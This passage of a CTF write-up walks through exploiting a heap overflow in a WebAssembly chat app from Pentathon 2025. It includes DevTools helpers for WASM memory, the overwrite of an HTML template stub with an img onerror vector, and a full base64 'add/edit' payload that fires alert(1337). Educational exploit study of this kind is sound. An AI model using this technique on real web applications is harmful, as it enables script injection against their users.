        <h5 class='sidetext'>Debugging</h5>
        <p>
            Now that we’ve spotted the vulnerability, it’s time to dig deeper into how the WASM module behaves at runtime. 
            For this, we’ll rely entirely on <strong>Chrome DevTools</strong>. DevTools is powerful enough to step through JavaScript, 
            pause inside WASM instructions, inspect the stack, and directly read/write WASM memory.
        </p>
        <p>
            Let’s walk through it step by step.
        </p>
        <ul>
            <li>
            Open your vulnerable web application in <strong>Google Chrome</strong>.
            </li>
            <li>
            Hit <code>F12</code> or right-click → <code>Inspect</code> to open Chrome DevTools.
            </li>
            <li>
            Rearrange the panels for convenience:
            <ul>
                <li>Keep the <strong>Console</strong> docked at the bottom.</li>
                <li>The <strong>Sources</strong> panel should be on top (this is where we’ll set breakpoints).</li>
            </ul>
            </li>
            <li>
            Your setup should look like this:<br>
            <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug.png' | relative_url }}" 
                alt="Chrome DevTools Layout Screenshot" class="code-screenshot" />
            </li>
        </ul>
        <h5 class='sidetext'>Breakpoint at the First Call to "addMsg"</h5>
        <p>
            We’ll start by intercepting the first call to the WASM <code>addMsg</code> function when a new message is submitted:
        </p>
        <ul>
            <li>Go to the <strong>Sources</strong> tab.</li>
            <li>Open <code>main.js</code> (you’ll find it under the site’s domain in DevTools).</li>
            <li>Scroll to line <code>106</code> — this is where <code>addMsg</code> is called.</li>
            <li>Set a breakpoint here by clicking the line number.</li>
            <li>Now type a message in the app’s chat box and click submit.</li>
            <li>Execution will pause at your breakpoint:<br>
            <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug1.png' | relative_url }}" 
                alt="Breakpoint at main.js line 106" class="code-screenshot" />
            </li>
        </ul>
        <h5 class='sidetext'>Stepping into the WASM Glue Code</h5>
        <ul>
            <li>Click <strong>Step Into</strong> (the down-arrow icon in DevTools, near the top right of the Sources panel).</li>
            <li>You’ll see execution jump from <code>main.js</code> into <code>module.js</code> — this is the glue code connecting JavaScript to WASM.</li>
            <li>The glue code sets up arguments, memory offsets, and finally calls the actual WASM function.</li>
            <li>Scroll to line <code>609</code> in <code>module.js</code>. This is where <code>addMsg</code> is actually invoked. 
                Set a breakpoint here so you can jump directly to this line in the future.</li>
            <li>At this point, you’re inside the glue code, right before the call enters WASM land.</li>
        </ul>
        <h5 class='sidetext'>Inspecting Function Arguments</h5>
        <p>
            On the right-hand panel in DevTools (the <strong>Scope</strong> tab), you can now see:
        </p>
        <ul>
            <li>The function being called (<code>addMsg</code>).</li>
            <li>Its arguments and their values.</li>
            <li>The first argument is a <strong>pointer into WASM’s linear memory</strong>, not the actual string. 
                This is how WASM functions exchange data — they pass around pointers (numeric memory offsets) rather than objects or strings.</li>
            <li>Other arguments are simple integers.</li>
            <li><img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug2.png' | relative_url }}" 
                    alt="Inspecting WASM arguments in DevTools" class="code-screenshot" /></li>
        </ul>
        <h5 class='sidetext'>Understanding HEAPU8</h5>
        <p>
            WASM modules store all data in a flat byte array called <strong>linear memory</strong>. In 
            Emscripten-generated modules (like this one), that memory is exposed as a JavaScript 
            <code>Uint8Array</code> called <code>HEAPU8</code>. 
        </p>
        <p>
            <code>HEAPU8</code> lets you read and write bytes directly in WASM memory:
        </p>
        <ul>
            <li><code>HEAPU8[pointer]</code> returns the byte at the specified memory address.</li>
            <li>You can interact with it just like a normal JavaScript array.</li>
        </ul>
        <p>To make debugging easier, we’ll define some helper functions to:</p>
        <ul>
            <li>Write bytes into WASM memory</li>
            <li>Read raw bytes from a pointer</li>
            <li>Read bytes as printable characters</li>
            <li>Search for strings in WASM memory</li>
        </ul>
        <h5 class='sidetext'>Helper Functions for WASM Memory Debugging</h5>
        <p>
            Paste these helper functions into the Console in DevTools:
        </p>
        <pre><code class="language-javascript">function writeBytes(ptr, byteArray) {
  if (!Array.isArray(byteArray)) {
    throw new Error("byteArray must be an array of numbers");
  }

  for (let i = 0; i < byteArray.length; i++) {
     byte = byteArray[i];
    if (typeof byte !== "number" || byte < 0 || byte > 255) {
      throw new Error(`Invalid byte at index ${i}: ${byte}`);
    }
    HEAPU8[ptr + i] = byte;
  }
}

function readBytes(ptr, length) {
  const bytes = HEAPU8.subarray(ptr, ptr + length); 
  return Array.from(bytes); // returns raw byte array
}
function readBytesAsChars(ptr, length) {
  const bytes = HEAPU8.subarray(ptr, ptr + length);
  
  return Array.from(bytes).map(b => {
    if (b >= 32 && b <= 126) {
      return String.fromCharCode(b);
    } else {
      return '.'; // Non-printable bytes shown as "."
    }
  }).join('');
}



function searchWasmMemory(searchStr) {
   mem = Module.HEAPU8;                // WASM memory as Uint8Array
   searchBytes = new TextEncoder().encode(searchStr);
  
  for (let i = 0; i < mem.length - searchBytes.length; i++) {
    let found = true;
    for (let j = 0; j < searchBytes.length; j++) {
      if (mem[i + j] !== searchBytes[j]) {
        found = false;
        break;
      }
    }
    if (found) {
      console.log(`Found "${searchStr}" at memory address:`, i);
      //return i; // return the index/address
    }
  }
  console.log(`"${searchStr}" not found in memory`);
  return -1;
}

a = bytes => bytes.reduce((acc, byte, i) => acc + (byte << (8 * i)), 0);</code></pre>
        <p>
            After pasting these, your DevTools console should look like this:
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug3.png' | relative_url }}" 
            alt="Helper functions loaded in DevTools console" class="code-screenshot" />
        <h5 class='sidetext'>Reading Message Data from a Pointer</h5>
        <p>
            Now that we have our helper functions, let’s use them to inspect the message we typed:
        </p>
        <ul>
            <li>Grab the pointer value of the message argument from the <strong>Scope</strong> tab in DevTools.</li>
            <li>
            In the console, run:
            <pre><code class="language-javascript">readBytesAsChars(POINTER_HERE, LENGTH_HERE)</code></pre>
            Replace <code>POINTER_HERE</code> with the pointer address, and <code>LENGTH_HERE</code> 
            with the number of bytes you expect (start small, like <code>20</code>).
            </li>
        </ul>
        <p>
            You’ll see the exact message you typed appear in DevTools!
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug4.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <p>
            Cool, right? Now let’s take this one step further. We’re finally stepping into the WebAssembly 
            module itself. At this point, DevTools shows nothing but raw WebAssembly instructions — we’re 
            no longer in JavaScript land, but inside the compiled <code>addMsg</code> function of the WASM module.
            Before going deeper, let’s pause and get comfortable with what we’re looking at.
        </p>
        <h5 class='sidetext'>WASM Instructions: A Stack-Based Virtual Machine</h5>
        <p>
            WebAssembly doesn’t use CPU registers like x86 or ARM; instead, it’s a stack-based virtual machine.
            Every calculation is done by pushing values onto a stack and popping them when needed. Instructions
            don’t name registers — they just consume whatever is on top of the stack.
        </p>
        <p>Here’s a simple example:</p>
        <pre><code class="language-javascript">
i32.const 5      ;; push 5 onto the stack
i32.const 3      ;; push 3
i32.add          ;; pop top two numbers (5 and 3), add them, push result (8)</code></pre>
        <p>
            At the end, the stack has a single value: <code>8</code>. No registers, no addressing modes, just stack operations.
        </p>
        <h5 class='sidetext'>Function Calls: Indexed, Not Pointer-Based</h5>
        <p>
            When a function is called in WASM, there’s no concept of function pointers like in native C/C++.
            Each function is assigned a fixed index at compile time, and function calls are simply by index:
        </p>
        <pre><code class="language-javascript">call $func15 ;; calls the function at index 15</code></pre>
        <ul>
            <li>It’s impossible to just “jump” to arbitrary memory like in a native binary.</li>
            <li>Even indirect calls (function-pointer-like behavior) are strictly controlled through a function table.</li>
            <li>This makes traditional exploitation techniques like ROP (Return-Oriented Programming) much harder in WASM.</li>
        </ul>
        <h5 class='sidetext'>Variables in WASM</h5>
        <p>WASM has three main categories of variables you’ll see while debugging:</p>
        <ul>
            <li>
            <strong>Stack Variables</strong>
            <ul>
                <li>Temporary values pushed and popped as instructions execute.</li>
                <li>Every operation works directly on this stack.</li>
                <li>Example: <code>i32.const 42</code> pushes <code>42</code> onto the stack.</li>
            </ul>
            </li>
            <li>
            <strong>Local Variables (<code>local</code>)</strong>
            <ul>
                <li>Variables local to a function (like C function variables).</li>
                <li>Stored in a small local array and accessed with <code>get_local</code> or <code>set_local</code>.</li>
                <li>
                Example:
                <pre><code class="language-javascript">local.get 0 ;; push the value of local variable #0 onto the stack
local.set 1 ;; pop a value and store it in local variable #1</code></pre>
                </li>
            </ul>
            </li>
            <li>
            <strong>Global Variables (<code>global</code>)</strong>
            <ul>
                <li>Shared across functions in the module.</li>
                <li>Accessed with <code>global.get</code> and <code>global.set</code>.</li>
                <li>
                Example:
                <pre><code class="language-javascript">global.get 0 ;; push the value of global #0
global.set 1 ;; set global #1 to top of stack
                </code></pre>
                </li>
            </ul>
            </li>
        </ul>
        <p>
           You can totally mess around with the WASM module at this point. Just keep stepping through instructions, drop breakpoints on the next function calls inside the current one, and cross-reference what’s running with the actual C source to see exactly where you are.
           <br><br>
            Keep an eye on the stack — watch values getting pushed and popped — and check out the arguments and variables sitting in memory. It’s all right there if you take the time to dig.<br><br>
            Alright, that’s enough WASM debugging for now. Let’s stop geeking out on stepping through instructions and actually get back to solving the challenge.
        </p>
        <blockquote>
            <em><code>Quick Tip</code> If stepping through WASM instructions in DevTools feels
            overwhelming, check out this intro video:<br>
            <a href="https://www.youtube.com/watch?v=BTLLPnW4t5s&t" target="_blank">Debugging WebAssembly in Chrome DevTools</a> —
            it’s a great walkthrough of setting breakpoints, inspecting the stack, and correlating instructions with your C/C++ source.</em>
        </blockquote>
        <p>
            Alright, back to business. Now that we’re comfortable stepping through WASM, let’s move deeper into <code>addMsg()</code> and grab the actual pointers that matter.
        </p>
        <p>
            Inside <code>addMsg()</code> there’s a call to <code>add_msg_to_stuff()</code>. This is a crucial spot because the arguments passed here include:
        </p>
        <ul>
            <li>The <code>s</code> struct pointer – holds the metadata for our message.</li>
            <li>The <code>new_msg</code> pointer – the actual message data we just submitted.</li>
        </ul>
        <p>
            Let’s set a breakpoint right before this function call:
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug5.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <p>
            Once we’ve paused there, let’s inspect the <code>s</code> pointer. Using our <code>readBytes()</code> helper, we can see the memory content for <code>s</code>:
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug6.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <p>
            Those highlighted bytes represent the pointer to <code>s->mess</code> — the start of the message struct where all metadata will be stored.
            Let’s use <strong>Step Over</strong> in DevTools so <code>add_msg_to_stuff()</code> executes and populates everything for us.
        </p>
        <p>
            After stepping over, we can inspect <code>s->mess</code>:
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug7.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <p>
            Now it’s all coming together. Here’s the relevant C struct:
        </p>
        <pre><code class="language-c">typedef struct msg {
            char *msg_data;       // Pointer to the actual message text
            size_t msg_data_len;  // Length of the message
            int msg_time;         // Timestamp
            int msg_status;       // Message status (maybe "sent" or "delivered")
        } msg;</code></pre>
        <p>
            The highlighted bytes here represent <code>msg->msg_data</code> — the pointer to the actual chat text we typed.
            Let’s follow that pointer and dump its contents:
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug8.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />        <p>
            Next, let’s send a second message. Pause again at <code>add_msg_to_stuff()</code>, step over, and inspect <code>s->mess</code> for this second message:
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug9.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />        <p>
            Using our helper functions (<code>readBytes</code>, <code>readBytesAsChars</code>), we confirm this second pointer points to the new message’s content.
            If we compare both addresses, the distance is clear:
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug10.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <p>
            Now, let’s edit the first message with a longer string to overflow into the second message:
        </p>
        <p>
            After the edit completes, pause again and inspect memory:
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug11.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <h5 class='sidetext'>Result of Overflow</h5>
        <ul>
            <li>The pointer to the first message’s data is unchanged.</li>
            <li>The second message’s data is overwritten by the overflow.</li>
        </ul>
        <p>
            This confirms the vulnerability — we can control adjacent message content by overflowing the first one.
        </p>
        <h5 class='sidetext'>Read/Write Primitive</h5>
        <p>
            At this point, all we’ve done is overflow into an adjacent message struct. Cool visualization, but that alone doesn’t give us control over anything powerful. If we’re going to weaponize this bug, we need a way to overwrite a meaningful pointer — something that lets us read or write anywhere in WASM’s linear memory. So, let’s look deeper into this snippet from the WASM module:
        </p>
        <pre><code class="language-c">int add_msg_to_stuff(stuff *s, msg new_msg) {
        if (s->size >= s->capacity) {
            s->capacity *= 2;
            s->mess = (msg *)realloc(s->mess, s->capacity * sizeof(msg));
            if (s->mess == NULL) {
                exit(1);
            }
        }
        s->mess[s->size++] = new_msg;
        return s->size-1;
        }</code></pre>
        <p>
            Key insights:
        </p>
        <ul>
            <li>The <code>stuff</code> struct (our top-level container for all messages) holds a pointer <code>s->mess</code>, which points to an array of <code>msg</code> structs.</li>
            <li>When we first start sending messages, the program allocates a chunk of memory for this array, sized based on the initial capacity.</li>
            <li>Every time we send a new message, a <code>msg</code> struct is added to <code>s->mess</code>.</li>
            <li>When the number of messages exceeds capacity (e.g., after ~10 messages), the program doubles the capacity and calls <code>realloc()</code> to resize <code>s->mess</code>.</li>
            <li>This causes <code>s->mess</code> to move to a new memory location, and all the old <code>msg</code> structs are copied there.</li>
        </ul>
        <p>
            Because <code>WASM</code> linear memory is sequential — allocations are placed one after another. After enough allocations, there’s a strong chance that this newly reallocated <code>s->mess</code> array lands right after the latest message’s data buffer.
            </p>
            <p>
            This layout is gold: if the relocated <code>s->mess</code> array is sitting next to user-controlled data, we can overflow from a message buffer and overwrite pointers inside the <code>s->mess</code> array itself. Since <code>s->mess</code> contains the pointers to every message’s data, corrupting it effectively gives us arbitrary <code>read/write</code> in <code>WASM</code> memory.
        </p>
        <h5 class='sidetext'>Testing the Hypothesis</h5>
        <p>Let’s test this theory step by step.</p>  
        <ul>
            <li>First, send <code>11</code> messages (one more than the likely starting capacity of <code>10</code>). For the <code>11th</code> message, set a breakpoint inside the <code>addMsg()</code> WASM function, right before <code>add_msg_to_stuff()</code> executes.</li>
            <li>Now, grab two things:
            <ul>
                <li>The current pointer value of <code>s->mess</code> (before reallocation).</li>
                <li>The <code>msg_data</code> pointer for this 11th message (so we know where its buffer lives).</li>
            </ul>
            </li>
        </ul>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug12.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <p>Now, step over the <code>add_msg_to_stuff()</code> call and check again:</p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug13.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <p>The <code>s->mess</code> pointer has changed, confirming that <code>realloc()</code> moved the array to a new spot in WASM memory.</p>
        <p>To verify, let’s dump the entire <code>s->mess</code> array after reallocation. Sure enough, it contains all 11 message structs with their respective pointers intact, just copied to the new location.</p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug14.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <p>Now, let’s focus on the relationship between the last message’s buffer and the relocated <code>s->mess</code>:</p>
        <p>Using our helper function, dump around <code>100</code> bytes starting from the 11th message’s <code>msg_data</code> pointer:</p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/debug15.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
        <p>And there it is — right after a small gap, we see the relocated <code>s->mess</code> array sitting in memory. This proves our theory:</p>
        <ul>
            <li>A long message buffer (user-controlled)</li>
            <li>Followed directly in memory by <code>s->mess</code> (which holds all message pointers)</li>
        </ul>
        <p><code>Boom</code>, this is the primitive we need.</p>
         <h5 class='sidetext'>Exploitation</h5>
            <p>
                Now that we have <strong>arbitrary read/write</strong> in WASM’s linear memory, the big question is: 
                <em>What do we overwrite to bypass the XSS filters and drop our payload?</em>
            </p>
            <p>
                The obvious first thought might be:
                <q>Why not overwrite the filter logic itself?</q>
            </p>
            <p>
                That would be nice, but it’s not possible here — the filtering happens 
                <strong>before</strong> our message ever makes it into WASM memory. By the time it’s stored, the input 
                has already been sanitized. So that path is blocked.
            </p>
            <p>
                Instead, let’s focus on <strong>where the sanitized message is inserted into the DOM</strong>.
            </p>
            <h5 class='sidetext'>The HTML Stub</h5>
            <p>
                The application renders each message using a hardcoded HTML template in memory:
            </p>
            <pre><code class="language-javascript">&lt;article&gt;&lt;p&gt;%.*s&lt;/p&gt;&lt;/article&gt;</code></pre>
            <p>
                This is the HTML stub string baked into the WASM module. The <code>%.*s</code> is a placeholder 
                replaced with our sanitized message content.
            </p>
            <p>
                What if we overwrite this stub to something malicious? Specifically, we’ll modify it so that instead 
                of inserting our sanitized text inside a <code>&lt;p&gt;</code> tag, it injects our content inside an 
                <code>&lt;img&gt;</code> tag’s <code>onerror</code> attribute — a classic XSS vector.
            </p>
            <pre><code class="language-javascript">&lt;img src=1      onerror=%.*s&gt;</code></pre>
            <p>Key details:</p>
            <ul>
                <li>We’re <strong>not adding new <code>&lt;</code> or <code>&gt;</code> brackets directly</strong> — those characters are filtered.</li>
                <li>We’re reusing the existing <code>&lt;</code> and <code>&gt;</code> from the original stub.</li>
                <li>The payload has extra spaces to ensure perfect alignment with the original tag boundaries in memory.</li>
            </ul>
            <p>
                By doing this, any “message” we send will effectively become JavaScript code executed via the 
                <code>onerror</code> attribute, completely bypassing the filters.
            </p>
            <h5 class='sidetext'>Finding the Stub’s Address</h5>
            <p>
                To overwrite this string, we first need its address in WASM linear memory. WASM modules don’t use 
                PIE (Position Independent Executables) or ASLR (Address Space Layout Randomization). 
                Memory is laid out <strong>deterministically</strong> at compile time.
            </p>
            <p>
                Using our <code>searchWasmMemory()</code> helper, we search for the exact string:
            </p>
            <pre><code class="language-javascript">searchWasmMemory('&lt;article&gt;&lt;p&gt;%.*s&lt;/p&gt;&lt;/article&gt;)
VM1601:49 Found "<article><p>%.*s</p></article>" at memory address: 65581</code></pre>
            <p>
                Since this offset is constant across every execution, we can reliably overwrite it in the exploit.
            </p>
            <h5 class='sidetext'>Crafting the Exploit Payload</h5>
            <p>Here’s the plan:</p>
            <ul>
                <li>
                Overflow from the <code>11th</code> message (triggering <code>realloc</code>) to overwrite the first 
                message’s pointer with the address of this HTML stub <code>+1</code> (to align perfectly with the start of the 
                <code>&lt;</code> tag).
                </li>
                <li>Overwrite the stub itself with our malicious <code>&lt;img&gt;</code> payload.</li>
                <li>
                Send a new “message” containing JavaScript code like <code>alert(1337)</code> — which gets inserted 
                directly into the <code>onerror</code> attribute and executes immediately.
                </li>
            </ul>
            <p>
                <strong>Why +1?</strong><br>
                We use +1 because the pointer needs to point inside the string, skipping the very first 
                <code>&lt;</code>. That way, when we overwrite the contents, we don’t disturb WASM memory alignment or 
                the existing tag boundaries.
            </p>
            <h5 class='sidetext'>The Overflow Payload</h5>
            <p>To overwrite the first message pointer, we edit the last (11th) message with this payload:</p>
            <pre><code class="language-javascript">"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050"</code></pre>
            <p>Why Unicode escapes?</p>
            <ul>
                <li>JavaScript strings only support Unicode text safely.</li>
                <li>
                Using <code>\u</code> escapes lets us write exact byte values directly into WASM memory without 
                unexpected encoding issues.
                </li>
            </ul>
            <p>
                Once that’s done, we edit the first message and replace its content with:
            </p>
            <pre><code class="language-javascript">"img src=1      onerror=%.*s "</code></pre>
            <p>
                At this point, the HTML stub in WASM memory has been surgically modified.
            </p>
            <h5 class='sidetext'>Testing</h5>
            <p>
                Now, sending a new message with <code>alert(1337)</code> should inject:
            </p>
            <pre><code class="language-javascript">&lt;img src=1 onerror=alert(1337)&gt;</code></pre>
            <p><strong>Boom.</strong></p>
            <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/exp.png' | relative_url }}" 
            alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
            <h5 class='sidetext'>Full Exploit Workflow</h5>
            <ul>
                <li>Send 11 messages to trigger <code>realloc()</code> and set up our overflow layout.</li>
                <li>Edit the 11th message to overwrite the first message’s pointer with the HTML stub’s memory address.</li>
                <li>Overwrite the stub itself with our <code>&lt;img&gt;</code> payload.</li>
                <li>Send a new message containing JavaScript code, e.g., <code>alert(1337)</code>.</li>
                <li>Watch your payload execute, bypassing all filters.</li>
            </ul>
            <p>The payload structure:</p>
            <pre><code class="language-javascript">[
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"add","content":"hi","time":1756840476392},
{"action":"edit","msgId":10,"content":"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050","time":1756885686080},
{"action":"edit","msgId":0,"content":"img src=1      onerror=%.*s ","time":1756885686080},
{"action":"add","content":"alert(1337)","time":1756840476392}
]</code></pre>
            <p>
                Finally, encode the entire payload in Base64 and pass it to the application as the 
                <code>s</code> GET parameter.
            </p>
            <p>
                And just like that, we’ve bypassed all sanitization logic, turning the chatbox into a 
                <code>JavaScript payload dropper</code> — straight out of WASM linear memory manipulation.
            </p>
            <h5 class='sidetext'>Getting the Flag</h5>
            <p>
                Let’s not dive too deep into this part since this post is all about <strong>WASM security</strong>, not flag retrieval. 
                But for context, the <code>bot.js</code> file is where the flag is handled. Here’s what happens:
            </p>
            <ul class="list-disc pl-6">
                <li>The bot injects the flag into the chat by creating a message containing the flag.</li>
                <li>This message is loaded into a first page in a headless Chrome instance.</li>
                <li>Your payload URL (with a base64-encoded <code>s</code> parameter) is opened in a second page.</li>
            </ul>
            <p class="mt-4">The code snippet makes this flow clear:</p>
            <pre><code class="language-javascript">page = await browser.newPage();
            visit = `[{"action":"add","content":"${FLAG}","time":1729881873363}]`
console.log(visit)
await page.goto(`http://localhost:3000/?s=${btoa(visit)}`);

await new Promise((resolve) => setTimeout(resolve, 3000));

const html1 = await page.content();
console.log("First page HTML:\n", html1);

await page.goto(
`http://localhost:3000/?s=${id}`,
{ timeout: 5000 }
);

await new Promise((resolve) => setTimeout(resolve, 3000));

const html2 = await page.content();
console.log("Second page HTML:\n", html2);

await page.close();</code></pre>
            <p class="mt-4">Notice what’s going on:</p>
            <ul class="list-disc pl-6">
                <li>The flag lives entirely in the DOM of the <code>first page</code>.</li>
                <li>Your XSS payload only runs in the <code>second page</code>.</li>
                <li>
                There’s no shared context or memory between these two browser pages, so you 
                <code>can’t exfiltrate</code> the first page’s DOM from the second page, even with full XSS control.
                </li>
            </ul>
            <p class="mt-4">
                I confirmed this with several web security experts, and it seems intentional: 
                this challenge (by <a href="https://traboda.com/ctf" target="_blank" rel="noopener noreferrer"><code>Traboda</code></a>, a platform partner of <code>Pentathon 2025</code>) is designed this way. 
                If not, it’d mean the challenge was broken, which would be a surprising oversight for an event like this!
            </p>
        <h4 class='text'>Wrap Up</h4>
        <p>
            Uff, this turned into quite a long post! If you’ve made it this far, hats off to you. 
            That’s some serious patience and dedication to learning new things. 
            Thanks a ton for sticking around and reading through everything I wrote here. 
            Hopefully, this deep dive gave you a solid understanding of <code>WASM security</code> 
            and maybe even sparked some ideas for your own tinkering. Keep that same curiosity, passion, and joy for learning alive because 
            that’s what makes this journey fun.
        </p>
    <h4 class='text'>References</h4>
    </div>
    <div id="references" class="challenge-section">
        <div id="ref" class="section-content">
            <ul>
            <li><a href="https://v8.dev/docs/wasm-compilation-pipeline" target="_blank" rel="noopener noreferrer">
                WebAssembly Compilation Pipeline (V8 Docs)
            </a></li>
            <li><a href="https://v8.dev/blog/liftoff" target="_blank" rel="noopener noreferrer">
                Liftoff: A New Baseline Compiler for WebAssembly
            </a></li>
            <li><a href="https://github.com/thlorenz/v8-perf/blob/master/compiler.md" target="_blank" rel="noopener noreferrer">
                V8 Performance: Compiler Details
            </a></li>
            <li><a href="https://www.youtube.com/watch?v=BTLLPnW4t5s&t" target="_blank" rel="noopener noreferrer">
                Debugging WebAssembly in Chrome DevTools (YouTube)
            </a></li>
            <li><a href="https://www.youtube.com/watch?v=DFPD9yI-C70" target="_blank" rel="noopener noreferrer">
                WebAssembly for Hackers (YouTube)
            </a></li>
            <li><a href="https://www.youtube.com/watch?v=BHwqORo_83E" target="_blank" rel="noopener noreferrer">
                Understanding WebAssembly Memory Model (YouTube)
            </a></li>
            <li><a href="https://ssd-disclosure.com/an-introduction-to-chrome-exploitation-webassembly-edition/" target="_blank" rel="noopener noreferrer">
                An Introduction to Chrome Exploitation: WebAssembly Edition (SSD-Disclosure)
            </a></li>
            </ul>
        </div>
    </div>   
</section>
</section>



<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js" integrity="sha512-UOoJElONeUNzQbbKQbjldDf9MwOHqxNz49NNJJ1d90yp+X9edsHyJoAs6O4K19CZGaIdjI5ohK+O2y5lBTW6uQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-python.min.js" integrity="sha512-3qtI9+9JXi658yli19POddU1RouYtkTEhTHo6X5ilOvMiDfNvo6GIS6k2Ukrsx8MyaKSXeVrnIWeyH8G5EOyIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-c.min.js" integrity="sha512-EWIJI7uQnA8ClViH2dvhYsNA7PHGSwSg03FAfulqpsFiTPHfhdQIvhkg/l3YpuXOXRF2Dk0NYKIl5zemrl1fmA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-javascript.min.js" integrity="sha512-yvw5BDA/GQu8umskpIOBhX2pDLrdOiriaK4kVxtD28QEGLV5rscmCfDjkrx52tIgzLgwzs1FsALV6eYDpGnEkQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
